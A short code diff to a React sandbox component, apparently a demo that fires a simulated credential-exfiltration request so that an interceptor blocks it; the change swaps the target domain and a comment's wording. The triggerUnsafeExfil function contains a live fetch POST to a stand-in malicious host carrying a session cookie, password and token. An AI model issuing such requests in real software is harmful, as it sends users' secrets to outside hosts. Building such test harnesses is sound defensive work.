@@ -38,10 +38,10 @@ export default function Sandbox() {
 
   // Triggers simulated malicious credential extraction to an untrusted external endpoint
   const triggerUnsafeExfil = () => {
-    addTerminalLog('⚡ Initiating: fetch("http://eval-server.cc/exfiltrate?cookie=session_token_xyz", { method: "POST", body: { "password": "root" } })...');
+    addTerminalLog('⚡ Initiating: fetch("http://malicious-domain.com/exfiltrate?cookie=session_token_xyz", { method: "POST", body: { "password": "root" } })...');
     
-    // We target a blocked domain and attach sensitive items, triggering Shrish's agent.
-    fetch('http://eval-server.cc/exfiltrate?cookie=session_token_xyz', {
+    // We target a blocked domain and attach sensitive items, triggering the interceptor.
+    fetch('http://malicious-domain.com/exfiltrate?cookie=session_token_xyz', {
       method: 'POST',
       body: JSON.stringify({ password: 'root_root_root', token: 'user_auth_secret_jwt' })
     })
